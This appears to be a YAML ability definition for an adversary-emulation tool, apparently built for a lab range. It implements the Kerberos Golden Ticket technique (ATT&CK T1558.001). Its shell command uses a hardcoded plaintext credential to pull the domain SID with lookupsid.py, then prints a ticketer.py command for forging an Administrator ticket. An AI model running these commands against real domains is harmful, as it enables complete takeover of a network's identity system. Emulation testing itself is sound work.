- id: col03-golden-ticket
  name: Golden Ticket Forge Domain Access
  description: Forge golden ticket using KRBTGT hash for unrestricted domain access
  tactic: collection
  technique:
    attack_id: T1558.001
    name: Steal or Forge Kerberos Tickets - Golden Ticket
  platforms:
    linux:
      sh:
        command: |
          DOMAIN_SID=$(lookupsid.py cyberstrike.mil/ansible:abc@123@10.0.20.101 2>/dev/null | grep 'Domain SID' | awk '{print $NF}'); echo "[+] Domain SID: $DOMAIN_SID"; echo '[INFO] Use ticketer.py -nthash <krbtgt_hash> -domain-sid $DOMAIN_SID -domain cyberstrike.mil Administrator'
        cleanup: |
          rm -f Administrator.ccache
  singleton: false
  repeatable: false
